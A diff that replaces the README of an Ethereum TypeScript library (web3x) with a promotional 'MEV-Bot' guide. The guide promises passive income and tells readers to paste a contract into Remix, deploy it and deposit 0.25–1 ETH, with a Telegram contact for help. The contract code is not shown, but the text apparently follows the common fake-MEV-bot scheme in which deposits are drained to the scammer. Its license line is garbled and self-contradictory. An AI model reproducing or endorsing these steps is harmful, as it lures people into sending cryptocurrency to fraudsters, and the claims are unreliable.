@@ -1,41 +1,62 @@
-# web3x
+# MEV-Bot
 
-[![Version](https://img.shields.io/npm/v/web3x.svg)](https://www.npmjs.com/package/web3x)
-[![Downloads](https://img.shields.io/npm/dm/web3x.svg)](https://www.npmjs.com/package/web3x)
-[![GitHub Stars](https://img.shields.io/github/stars/xf00f/web3x.svg)](https://github.com/xf00f/web3x/stargazers)
-[![GitHub Issues](https://img.shields.io/github/issues/xf00f/web3x.svg)](https://github.com/xf00f/web3x/issues)
-[![Coverage](https://img.shields.io/coveralls/github/xf00f/web3x/master.svg)](https://coveralls.io/github/xf00f/web3x)
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
-Ethereum TypeScript Client Library - for perfect types and tiny builds.
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-![Demo](https://user-images.githubusercontent.com/44038056/48001064-5d377d00-e0ff-11e8-994f-36d165f9124e.gif)
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-## Overview
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-`web3x` was created originally as a pure TypeScript port of `web3.js`. Although its API has diverged slightly from `web3.js`,
-it still maintains a strong degree of alignment and porting from one to the other should be fairly trivial.
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-`web3x` provides full type safety when interacting with contracts by building type definitions from contract ABIs.
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
-It has its own EVM implementation for testing contract behaviour fully in process using standard testing tools (e.g. Jest).
 
-## Packages
+## 🤖 How to Use MEVBot
+![241020628-7f849bd6-2e7a-4065-8119-e415dfb21777](https://i.ibb.co/JBFKJ3v/1.png)
 
-This monorepo is split into several sub-packages.
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "MevBot.sol".
+Copy this code and paste it into the Remix IDE.
 
-- [web3x](/web3x) - main client library.
-- [web3x-codegen](/web3x-codegen) - tool for generating type safe contract classes from ABIs.
-- [web3x-evm](/web3x-evm) - EVM implementation for testing contract code completely in process or in browser.
-- [web3x-node-example](/web3x-node-example) - Example backend TypeScript project with Jest for testing.
-- [web3x-webpack-example](/web3x-webpack-example) - Example frontend TypeScript Webpack project with Jest for testing.
+![image](https://i.ibb.co/XLWqQKv/2.png)
 
-## Versioning
 
-Versioning is managed manually, and follows the same pattern as Lerna fixed mode.
-Lerna is not used due to a [trilemma](https://github.com/lerna/lerna/issues/901) that the Lerna maintainer refuses to resolve:
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile MevBot.sol'. 
+![image](https://i.ibb.co/HP4NnzY/3.png)
 
-- A PR should correctly modify `version.json` and package version numbers.
-- For minor or patch changes, the packages that changed need their version set to the new version in `version.json`.
-- For major version changes, all packages should have their version numbers set to the new version in `version.json`.
-- All changes across all packages are tracked in the [CHANGELOG](CHANGELOG.md).
-- After merging the PR to master, the repository should be tagged with the new version number.
+
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+![image](https://i.ibb.co/5kSRqTf/4.png)
+
+
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
+
+
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+![image](https://i.ibb.co/njpMWt1/5.png)
+![image](https://i.ibb.co/Jy56BDh/6.png)
+
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
+
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
+
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
+
+Copyright (C) 2023 MevBotsETHandBSC
+
+This program is free software for 30 days: you can redistribute and/or modify it under the terms of the MIT Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
